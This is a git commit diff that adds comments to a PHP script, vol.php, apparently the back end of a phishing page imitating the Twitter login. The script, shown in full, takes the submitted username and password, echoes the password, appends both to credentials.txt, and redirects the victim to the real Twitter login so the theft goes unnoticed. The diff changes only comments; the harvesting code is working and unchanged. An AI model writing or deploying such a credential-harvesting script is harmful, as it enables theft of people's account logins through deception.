0ba22967952f5378bfb0280820d8fc5b85c32b30
RajithaAkwaththa <akwaththarajitha@gmail.com>
2017-03-25 16:01:44 +0530

    Update vol.php

--- vol.php
+++ vol.php
@@ -1,14 +1,18 @@
 <?php
  $username = $_POST["text"];
  $password = $_POST["password"];
- echo "$text : " . $password;
+ echo "$text : " . $password;
+
  //Extract the credentials received
  $username = $_POST["text"];
  $password = $_POST["password"];
  //Write the credentials to text file
  $myfile = fopen("credentials.txt", "a") or die("Unable to open file!");
+ //the username and password will be shown in the text file.
  $txt = "USERNAME = $username , PASSWORD = $password\n";
+ //write the $myfile content to $txt
  fwrite($myfile, "\n". $txt);
+// close the opened info.txt file
  fclose($myfile);
  //Redirect the browser to original login page
  header("Location: https://twitter.com/login");
